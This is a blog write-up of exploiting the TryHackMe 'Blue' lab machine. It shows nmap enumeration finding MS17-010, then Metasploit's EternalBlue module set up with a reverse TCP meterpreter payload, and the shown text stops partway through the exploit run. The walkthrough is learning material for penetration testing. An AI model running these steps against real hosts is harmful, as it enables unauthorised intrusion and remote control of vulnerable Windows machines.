<!doctype html><html lang=en-us><head><title>Blue Boot2Root Write-Up | Nate Catelli's Blog</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="A boot2root writeup of the Blue host from TryHackMe."><meta name=generator content="Hugo 0.101.0"><meta name=ROBOTS content="INDEX, FOLLOW"><link rel=stylesheet href=/css/style.css></head><body><nav class=navigation><a href=/><span class=arrow>‚Üê</span>Home</a>
<a href=/posts>Archive</a>
<a href=/tags>Tags</a>
<a href=/about>About</a>
<a href=/projects>Projects</a>
<a href=/misc>Misc</a>
<a class=button href=https://ncatelli.github.io/index.xml>Subscribe</a></nav><main class=main><section id=single><h1 class=title>Blue Boot2Root Write-Up</h1><div class=tip><time datetime="2020-11-11 00:00:00 +0000 UTC">Nov 11, 2020</time>
<span class=split>¬∑</span>
<span>4382 words</span>
<span class=split>¬∑</span>
<span>21 minute read</span></div><aside class=toc><details><summary>Table of Contents</summary><div><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#environment>Environment</a></li><li><a href=#attacking-blue-with-metasploit>Attacking Blue with Metasploit</a><ul><li><a href=#host-enumeration>Host enumeration</a></li><li><a href=#preparing-the-attack>Preparing the attack</a></li><li><a href=#foothold>Foothold</a></li><li><a href=#wrapping-up>Wrapping up</a></li></ul></li><li><a href=#attacking-blue-without-metasploit>Attacking Blue without Metasploit</a><ul><li><a href=#preparing-the-attack-1>Preparing the attack</a></li><li><a href=#foothold-1>Foothold</a></li><li><a href=#wrapping-up-1>Wrapping Up</a></li></ul></li><li><a href=#summary>Summary</a></li></ul></nav></div></details></aside><div class=content><h2 id=introduction>Introduction <a href=#introduction class=anchor>üîó</a></h2><p>After participating in the Disney Can-You-Hack-It CTF, I&rsquo;ve been trying to spend more of my time studying security and offensive penetration testing. My main goal is to balance understanding how to effectively perform an attack with the awesome frameworks out there like metasploit while gaining a better understanding of what this framework is doing under the hood. This post is the first of many that will follow me documenting both the attacks and my methodologies.</p><h2 id=environment>Environment <a href=#environment class=anchor>üîó</a></h2><p>Both attacks take place in a flat network consisting of my attack host, which is a freshly-booted Kali Linux livecd, and the the target host, a freshly-booted Windows VM that I knew contained 3 flags to capture. No other information is known about the host, like what it&rsquo;s running or its OS version, but I would be lying if I said I didn&rsquo;t assume that this would be an eternalblue attack based off the name.</p><h2 id=attacking-blue-with-metasploit>Attacking Blue with Metasploit <a href=#attacking-blue-with-metasploit class=anchor>üîó</a></h2><p>I started the attack by opening a tmux session and starting meterpreter with <code>msfdb run</code> to spin up a postgres instance for persisting scans and recon data.</p><h3 id=host-enumeration>Host enumeration <a href=#host-enumeration class=anchor>üîó</a></h3><p>Given that I was investigating a single host, and that I had an unfair suspicion of what kind of attack vector I would be looking for, I started with a default script and service version scan.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 &gt; db_nmap -sV -sC -Pn 10.10.201.83
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Starting Nmap 7.80 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2020-11-11 01:53 UTC
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Nmap scan report <span style=color:#66d9ef>for</span> ip-10-10-201-83.eu-west-1.compute.internal <span style=color:#f92672>(</span>10.10.201.83<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Host is up <span style=color:#f92672>(</span>0.00053s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Not shown: <span style=color:#ae81ff>991</span> closed ports
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: PORT      STATE SERVICE      VERSION
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: 135/tcp   open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: 445/tcp   open  microsoft-ds Windows <span style=color:#ae81ff>7</span> Professional <span style=color:#ae81ff>7601</span> Service Pack <span style=color:#ae81ff>1</span> microsoft-ds <span style=color:#f92672>(</span>workgroup: WORKGROUP<span style=color:#f92672>)</span>n  tcpwrapped
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |_ssl-date: 2020-11-11T01:55:05+00:00; 0s from scanner time.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: 49152/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: 49153/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: 49154/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: 49158/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: 49160/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: MAC Address: 02:B5:23:84:9D:19 <span style=color:#f92672>(</span>Unknown<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Host script results:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |_clock-skew: mean: 1h29m59s, deviation: 3h00m00s, median: 0s
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |_nbstat: NetBIOS name: JON-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:b5:23:84:9d:19 <span style=color:#f92672>(</span>unknown<span style=color:#f92672>)</span>mb-os-discovery:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |   OS: Windows <span style=color:#ae81ff>7</span> Professional <span style=color:#ae81ff>7601</span> Service Pack <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>Windows <span style=color:#ae81ff>7</span> Professional 6.1<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |   Computer name: Jon-PC
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |   NetBIOS computer name: JON-PC<span style=color:#ae81ff>\x</span><span style=color:#ae81ff>00</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |   Workgroup: WORKGROUP<span style=color:#ae81ff>\x</span><span style=color:#ae81ff>00</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |_  System time: 2020-11-10T19:54:50-06:00
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: | smb-security-mode:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |   account_used: guest
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |   authentication_level: user
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |   challenge_response: supported
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |_  message_signing: disabled <span style=color:#f92672>(</span>dangerous, but default<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: | smb2-security-mode:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |   2.02:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |_    Message signing enabled but not required
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: | smb2-time:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |   date: 2020-11-11T01:54:50
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |_  start_date: 2020-11-11T01:51:00
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 140.63 seconds
</span></span></code></pre></div><p>This initial scan began to confirm my suspicions that this was an eternalblue attack since it looked like the host was a Windows 7 Service Pack 1 machine with SMB available. In addition, this ended up leaking a potential username as the computer&rsquo;s name, which was worth keeping in mind as a potential administrative user going forward. Additionally this pointed out relaxed security setting in the smb service&rsquo;s configuration.</p><p>With the information I collected so far, I decided to probe a little further into SMB with an enumaration using nmap&rsquo;s <code>smb-enum-shares</code> scripts.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 &gt; db_nmap --script smb-enum-shares  -p <span style=color:#ae81ff>445</span> 10.10.201.83
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Starting Nmap 7.80 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2020-11-11 01:58 UTC
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Nmap scan report <span style=color:#66d9ef>for</span> ip-10-10-201-83.eu-west-1.compute.internal <span style=color:#f92672>(</span>10.10.201.83<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Host is up <span style=color:#f92672>(</span>0.00020s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: PORT    STATE SERVICE
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: 445/tcp open  microsoft-ds
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: MAC Address: 02:B5:23:84:9D:19 <span style=color:#f92672>(</span>Unknown<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Host script results:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: | smb-enum-shares:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |   note: ERROR: Enumerating shares failed, guessing at common ones <span style=color:#f92672>(</span>NT_STATUS_ACCESS_DENIED<span style=color:#f92672>)</span> |   account_used: &lt;blank&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |   <span style=color:#ae81ff>\\</span>10.10.201.83<span style=color:#ae81ff>\A</span>DMIN$:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |     warning: Couldn<span style=color:#e6db74>&#39;t get details for share: NT_STATUS_ACCESS_DENIED
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] Nmap: |     Anonymous access: &lt;none&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] Nmap: |   \\10.10.201.83\C$:
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] Nmap: |     warning: Couldn&#39;</span>t get details <span style=color:#66d9ef>for</span> share: NT_STATUS_ACCESS_DENIED
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |     Anonymous access: &lt;none&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |   <span style=color:#ae81ff>\\</span>10.10.201.83<span style=color:#ae81ff>\I</span>PC$:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |     warning: Couldn<span style=color:#960050;background-color:#1e0010>&#39;</span>t get details <span style=color:#66d9ef>for</span> share: NT_STATUS_ACCESS_DENIED
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |_    Anonymous access: READ
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 0.85 seconds
</span></span></code></pre></div><p>This indicated anonymous read access on the IPC share, another piece of evidence pointing to eternalblue as being the attack vector. With this information, I decided I should kick off a quick vuln scan with <code>nmap</code> to see if it would infact identify eternalblue. Which it quickly did, as <code>ms17-010</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 &gt; db_nmap --script vuln  -p <span style=color:#ae81ff>445</span> 10.10.201.83
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Starting Nmap 7.80 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2020-11-11 02:03 UTC
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Nmap scan report <span style=color:#66d9ef>for</span> ip-10-10-201-83.eu-west-1.compute.internal <span style=color:#f92672>(</span>10.10.201.83<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Host is up <span style=color:#f92672>(</span>0.00046s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: PORT    STATE SERVICE
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: 445/tcp open  microsoft-ds
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |_clamav-exec: ERROR: Script execution failed <span style=color:#f92672>(</span>use -d to debug<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: MAC Address: 02:B5:23:84:9D:19 <span style=color:#f92672>(</span>Unknown<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Host script results:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |_smb-vuln-ms10-054: false
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: | smb-vuln-ms17-010:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |   VULNERABLE:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |   Remote Code Execution vulnerability in Microsoft SMBv1 servers <span style=color:#f92672>(</span>ms17-010<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |     State: VULNERABLE
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |     IDs:  CVE:CVE-2017-0143
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |     Risk factor: HIGH
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |       A critical remote code execution vulnerability exists in Microsoft SMBv1
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |        servers <span style=color:#f92672>(</span>ms17-010<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |     Disclosure date: 2017-03-14
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |     References:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style=color:#f92672>=</span>CVE-2017-0143
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 15.51 seconds
</span></span></code></pre></div><p>I now had a potential attack vector to explore, but I decided to do a quick recap of the services on the host to make sure I didn&rsquo;t miss anything. This was crucial because I had overlooked an open RDP port, which ended up being important later in the attack.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 &gt; services 
</span></span><span style=display:flex><span>Services
</span></span><span style=display:flex><span><span style=color:#f92672>========</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>host          port   proto  name           state  info
</span></span><span style=display:flex><span>----          ----   -----  ----           -----  ----
</span></span><span style=display:flex><span>10.10.201.83  <span style=color:#ae81ff>135</span>    tcp    msrpc          open   Microsoft Windows RPC
</span></span><span style=display:flex><span>10.10.201.83  <span style=color:#ae81ff>139</span>    tcp    netbios-ssn    open   Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>10.10.201.83  <span style=color:#ae81ff>445</span>    tcp    microsoft-ds   open   Windows <span style=color:#ae81ff>7</span> Professional <span style=color:#ae81ff>7601</span> Service Pack <span style=color:#ae81ff>1</span> microsoft-ds workgroup: WORKGROUP
</span></span><span style=display:flex><span>10.10.201.83  <span style=color:#ae81ff>3389</span>   tcp    ms-wbt-server  open   
</span></span><span style=display:flex><span>10.10.201.83  <span style=color:#ae81ff>49152</span>  tcp    unknown        open   Microsoft Windows RPC
</span></span><span style=display:flex><span>10.10.201.83  <span style=color:#ae81ff>49153</span>  tcp    unknown        open   Microsoft Windows RPC
</span></span><span style=display:flex><span>10.10.201.83  <span style=color:#ae81ff>49154</span>  tcp    unknown        open   Microsoft Windows RPC
</span></span><span style=display:flex><span>10.10.201.83  <span style=color:#ae81ff>49158</span>  tcp    unknown        open   Microsoft Windows RPC
</span></span><span style=display:flex><span>10.10.201.83  <span style=color:#ae81ff>49160</span>  tcp    unknown        open   Microsoft Windows RPC
</span></span></code></pre></div><h3 id=preparing-the-attack>Preparing the attack <a href=#preparing-the-attack class=anchor>üîó</a></h3><p>The first step was to check if there were any exploits available for <code>ms17-010</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 &gt; search ms17-010
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Matching Modules
</span></span><span style=display:flex><span><span style=color:#f92672>================</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   <span style=color:#75715e>#  Name                                           Disclosure Date  Rank     Check  Description</span>
</span></span><span style=display:flex><span>   -  ----                                           ---------------  ----     -----  -----------
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0</span>  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>1</span>  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>2</span>  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>3</span>  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption <span style=color:#66d9ef>for</span> Win8+
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>4</span>  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>5</span>  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Interact with a module by name or index, <span style=color:#66d9ef>for</span> example use <span style=color:#ae81ff>5</span> or use exploit/windows/smb/smb_doublepulsar_rce
</span></span></code></pre></div><p>Since previous scans pointed to the target OS being windows 7, the second option in the list seemed like a perfect candidate.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 &gt; use <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>windows/smb/ms17_010_eternalblue<span style=color:#f92672>)</span> &gt; setg RHOSTS 10.10.201.83
</span></span><span style=display:flex><span>RHOSTS <span style=color:#f92672>=</span>&gt; 10.10.201.83
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>windows/smb/ms17_010_eternalblue<span style=color:#f92672>)</span> &gt; show options
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Module options <span style=color:#f92672>(</span>exploit/windows/smb/ms17_010_eternalblue<span style=color:#f92672>)</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name           Current Setting  Required  Description
</span></span><span style=display:flex><span>   ----           ---------------  --------  -----------
</span></span><span style=display:flex><span>   RHOSTS         10.10.201.83     yes       The target host<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>, range CIDR identifier, or hosts file with syntax <span style=color:#e6db74>&#39;file:&lt;path&gt;&#39;</span>
</span></span><span style=display:flex><span>   RPORT          <span style=color:#ae81ff>445</span>              yes       The target port <span style=color:#f92672>(</span>TCP<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   SMBDomain      .                no        <span style=color:#f92672>(</span>Optional<span style=color:#f92672>)</span> The Windows domain to use <span style=color:#66d9ef>for</span> authentication
</span></span><span style=display:flex><span>   SMBPass                         no        <span style=color:#f92672>(</span>Optional<span style=color:#f92672>)</span> The password <span style=color:#66d9ef>for</span> the specified username
</span></span><span style=display:flex><span>   SMBUser                         no        <span style=color:#f92672>(</span>Optional<span style=color:#f92672>)</span> The username to authenticate as
</span></span><span style=display:flex><span>   VERIFY_ARCH    true             yes       Check <span style=color:#66d9ef>if</span> remote architecture matches exploit Target.
</span></span><span style=display:flex><span>   VERIFY_TARGET  true             yes       Check <span style=color:#66d9ef>if</span> remote OS matches exploit Target.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Payload options <span style=color:#f92672>(</span>windows/x64/meterpreter/reverse_tcp<span style=color:#f92672>)</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name      Current Setting  Required  Description
</span></span><span style=display:flex><span>   ----      ---------------  --------  -----------
</span></span><span style=display:flex><span>   EXITFUNC  thread           yes       Exit technique <span style=color:#f92672>(</span>Accepted: <span style=color:#e6db74>&#39;&#39;</span>, seh, thread, process, none<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   LHOST     10.10.100.83     yes       The listen address <span style=color:#f92672>(</span>an interface may be specified<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   LPORT     <span style=color:#ae81ff>4444</span>             yes       The listen port
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Exploit target:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Id  Name
</span></span><span style=display:flex><span>   --  ----
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0</span>   Windows <span style=color:#ae81ff>7</span> and Server <span style=color:#ae81ff>2008</span> R2 <span style=color:#f92672>(</span>x64<span style=color:#f92672>)</span> All Service Packs
</span></span></code></pre></div><p>I left the default payload as the staged reverse TCP shell, and kicked off an attack to see if I could get a shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>windows/smb/ms17_010_eternalblue<span style=color:#f92672>)</span> &gt; run -j
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Exploit running as background job 0.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Exploit completed, but no session was created.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Started reverse TCP handler on 10.10.100.83:4444 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.201.83:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> 10.10.201.83:445      - Host is likely VULNERABLE to MS17-010! - Windows <span style=color:#ae81ff>7</span> Professional <span style=color:#ae81ff>7601</span> Service Pack <span style=color:#ae81ff>1</span> x64 <span style=color:#f92672>(</span>64-bit<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.201.83:445      - Scanned <span style=color:#ae81ff>1</span> of <span style=color:#ae81ff>1</span> hosts <span style=color:#f92672>(</span>100% complete<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.201.83:445 - Connecting to target <span style=color:#66d9ef>for</span> exploitation.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> 10.10.201.83:445 - Connection established <span style=color:#66d9ef>for</span> exploitation.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> 10.10.201.83:445 - Target OS selected valid <span style=color:#66d9ef>for</span> OS indicated by SMB reply
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.201.83:445 - CORE raw buffer dump <span style=color:#f92672>(</span><span style=color:#ae81ff>42</span> bytes<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.201.83:445 - 0x00000000  <span style=color:#ae81ff>57</span> <span style=color:#ae81ff>69</span> 6e <span style=color:#ae81ff>64</span> 6f <span style=color:#ae81ff>77</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>37</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>50</span> <span style=color:#ae81ff>72</span> 6f <span style=color:#ae81ff>66</span> <span style=color:#ae81ff>65</span> <span style=color:#ae81ff>73</span>  Windows <span style=color:#ae81ff>7</span> Profes
